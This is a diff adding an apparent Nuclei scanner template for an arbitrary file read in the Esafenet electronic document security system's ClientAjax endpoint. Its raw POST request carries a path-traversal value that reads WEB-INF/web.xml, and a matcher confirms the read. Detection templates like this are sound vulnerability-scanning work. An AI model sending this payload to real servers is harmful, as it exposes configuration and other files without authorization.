@@ -1,0 +1,27 @@
+id: esafenet-client-ajax-download
+
+info:
+  name: 亿赛通电子文档安全系统 ClientAjax 任意文件读取
+  author: HuanXiong
+  severity: high
+  description: |-
+    亿赛通电子文档安全系统 ClientAjax 任意文件读取
+  reference:
+    - 
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/ClientAjax  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'<servlet-name>CDGPermissions</servlet-name>')"
